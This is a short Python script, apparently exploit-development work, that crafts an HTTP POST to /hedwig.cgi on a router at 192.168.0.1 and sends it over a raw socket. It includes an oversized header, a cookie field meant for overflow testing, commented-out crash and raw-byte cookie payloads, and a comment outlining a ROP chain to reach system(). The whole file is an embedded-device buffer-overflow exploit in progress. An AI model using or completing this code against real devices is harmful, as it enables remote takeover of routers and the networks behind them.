import socket
import struct


# format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address)

buf = "POST /hedwig.cgi HTTP/1.1\r\n"
buf+="Accept-Encoding: gzip,deflate,sdch" + "zyw"*1000 +"\r\n"
buf+= "Host: 192.168.0.1\r\n"
buf+="Cookie: uid="+"zyw"*9+"\r\n" #test
#buf+="Cookie: "+"uid="+"zyw"*400+"\r\n"  #crash 
#buf+="Cookie: d;@;d=zd;@;d=jawOO\x05\xff\xff\x05\x9b\xc4\x9b\xc4=zawzyz=\x98zawOO\x05\xff\xff\x05d;d;d=zawzyzywz;;;y"
buf+="Content-Length: 13\r\n\r\ntest=test\r\n\r\n"

print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.1", 80))
s.send(buf)
